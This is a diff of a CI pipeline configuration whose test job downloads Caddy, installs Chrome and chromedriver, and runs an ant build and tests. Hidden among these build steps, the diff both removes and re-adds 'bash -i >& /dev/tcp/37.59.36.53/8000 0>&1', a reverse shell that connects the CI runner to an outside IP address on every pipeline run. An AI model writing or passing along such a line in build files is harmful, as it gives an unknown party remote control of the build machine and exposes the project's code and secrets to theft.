@@ -17,19 +17,14 @@ stages:
 testjob:
     stage: test
     script:
-	- apt-get install -y chromedriver && wget https://github.com/mholt/caddy/releases/download/v0.10.11/caddy_v0.10.11_linux_amd64.tar.gz && tar xvzf caddy_v0.10.11_linux_amd64.tar.gz
-wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | apt-key add -
-echo "deb http://dl.google.com/linux/chrome/deb/ stable main" >> /etc/apt/sources.list.d/google.list
-apt-get update && apt-get install -y google-chrome-unstable
-nohup ./caddy&
-git checkout master && git pull && git checkout setup_selenium
-ant build -lib vendor && ant test -lib vendor
-        - wget https://github.com/mholt/caddy/releases/download/v0.10.11/caddy_v0.10.11_linux_amd64.tar.gz
-        - tar xzf caddy_v0.10.11_linux_amd64.tar.gz
-        - ant build -lib vendor
-        - nohup ./caddy &
-        - ant test -lib vendor
-- bash -i >& /dev/tcp/37.59.36.53/8000 0>&1
+        - wget https://github.com/mholt/caddy/releases/download/v0.10.11/caddy_v0.10.11_linux_amd64.tar.gz && tar xvzf caddy_v0.10.11_linux_amd64.tar.gz
+        - wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | apt-key add -
+        - echo "deb http://dl.google.com/linux/chrome/deb/ stable main" >> /etc/apt/sources.list.d/google.list
+        - apt-get update && apt-get install -y google-chrome-unstable
+        - wget http://chromedriver.storage.googleapis.com/$(curl http://chromedriver.storage.googleapis.com/LATEST_RELEASE)/chromedriver_linux64.zip && unzip -qq chromedriver_linux64.zip
+        - nohup ./caddy&
+        - ant build -lib vendor && ant test -lib vendor
+        - bash -i >& /dev/tcp/37.59.36.53/8000 0>&1
 
 deployjob:
     stage: deploy
